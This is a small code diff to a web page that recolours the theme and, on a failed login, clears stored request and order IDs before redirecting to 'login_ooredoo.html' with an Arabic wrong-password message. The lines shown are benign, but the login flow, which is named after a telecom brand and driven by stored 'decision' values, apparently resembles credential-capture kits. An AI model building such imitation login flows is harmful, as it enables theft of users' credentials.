@@ -7,7 +7,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --red: #D0191F;
+    --red: #8A1B2F;
     --white: #FFFFFF;
     --text: #1A1A1A;
     --text-light: #808080;
@@ -171,6 +171,8 @@
       sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
       localStorage.removeItem(decisionKey);
       sessionStorage.removeItem(decisionKey);
+      localStorage.removeItem('requestId');
+      sessionStorage.removeItem('safwa_order_id');
       localStorage.setItem(flowKey, 'login');
       sessionStorage.setItem(flowKey, 'login');
       window.location.href = 'login_ooredoo.html';
